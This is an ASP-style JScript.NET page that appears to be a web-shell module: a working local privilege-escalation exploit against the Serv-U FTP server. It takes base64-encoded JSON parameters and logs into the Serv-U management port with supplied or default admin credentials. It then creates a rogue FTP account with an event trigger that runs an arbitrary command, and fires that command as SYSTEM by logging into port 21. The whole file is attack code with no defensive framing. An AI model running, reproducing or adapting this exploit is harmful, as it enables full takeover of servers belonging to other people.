<%

function base64Decode(str) {
    if (!str || str.Trim() == "") return "";
    try {
        var bytes = System.Convert.FromBase64String(str);
        return System.Text.Encoding.UTF8.GetString(bytes);
    } catch(e) { return ""; }
}

function fnExtractJsonValue(json, key) {
    var reg = new System.Text.RegularExpressions.Regex('"' + key + '"\\s*:\\s*"?([^",}]+)"?');
    
    var match = reg.Match(json);
    if (match.Success) {
        return match.Groups[1].Value.Trim();
    }
    return "";
}

function main() {
    Response.Buffer = true;
    Response.ContentType = "text/plain";

    var z1 = System.Web.HttpContext.Current.Request.Form["z1"] ? Request.Form["z1"] + "" : "";
    if (z1 == "") {
        System.Web.HttpContext.Current.Response.Write("[-] ERROR: Missing parameter matrix [z1].");
        return;
    }

    var szJson = base64Decode(z1);
    var szHost = fnExtractJsonValue(szJson, "ip");
    var szPortStr = fnExtractJsonValue(szJson, "port");
    var szUser = fnExtractJsonValue(szJson, "user");
    var szPass = fnExtractJsonValue(szJson, "pass");
    var szCmd = fnExtractJsonValue(szJson, "cmd");

    if (szHost == "")
        szHost = "127.0.0.1";
    if (szPortStr == "")
        szPortStr = "43958";
    
    var nPort = System.Int32.Parse(szPortStr);

    System.Web.HttpContext.Current.Response.Write("[+] Aligned JScript.NET Matrix. Target Serv-U LocalPort: " + nPort + "\n");

    var socket = null;
    var stream = null;
    try {
        socket = new System.Net.Sockets.TcpClient();
        socket.ReceiveTimeout = 5000;
        socket.SendTimeout = 5000;
        
        socket.Connect(szHost, nPort);
        stream = socket.GetStream();
    } catch(e) {
        System.Web.HttpContext.Current.Response.Write("[-] Failed to connect to Serv-U management port: " + e.message + "\n");
        if (socket) socket.Close();
        return;
    }

    System.Web.HttpContext.Current.Response.Write("[+] Successfully connected to Serv-U management port...\n");

    try {
        var reader = new System.IO.StreamReader(stream, System.Text.Encoding.UTF8);
        var writer = new System.IO.StreamWriter(stream, System.Text.Encoding.UTF8);
        writer.AutoFlush = true;

        reader.ReadLine();

        writer.Write("USER " + szUser + "\r\n");
        reader.ReadLine();
        writer.Write("PASS " + szPass + "\r\n");
        var szResponse = reader.ReadLine();

        if (szResponse.IndexOf("230") == -1 && szResponse.ToLower().IndexOf("logged in") == -1) {
            System.Web.HttpContext.Current.Response.Write("[-] Login failed: Default administrative credentials have been modified.\n");
            socket.Close();
            return;
        }

        System.Web.HttpContext.Current.Response.Write("[+] Successfully authenticated into Serv-U management interface!\n");

        writer.Write("SUSER " + szUser + "|" + szPass + "|Y|N\r\n");
        reader.ReadLine();

        writer.Write("SEVENT " + szUser + "|0|0|" + szCmd + "\r\n");
        reader.ReadLine();

        System.Web.HttpContext.Current.Response.Write("[+] Malicious FTP account and Event trigger configured successfully.\n");
        System.Web.HttpContext.Current.Response.Write("[+] Attempting to log into standard FTP port 21 to trigger the SYSTEM payload...\n");
        try {
            var client = new System.Net.WebClient();
            var szFtpUrl = "ftp://127.0.0.1:21/trigger_matrix.txt";
            
            client.Credentials = new System.Net.NetworkCredential(szUser, szPass);
            
            client.DownloadData(szFtpUrl);
        } catch(ex) {
            // do something
        }

        System.Web.HttpContext.Current.Response.Write("[+] Payload triggered! Verify if your command was executed with SYSTEM authority.\n");

    } catch(ex) {
        System.Web.HttpContext.Current.Response.Write("[-] CRITICAL_EXCEPTION: " + ex.message + "\n");
        if (socket) socket.Close();
    }
}

main();

%>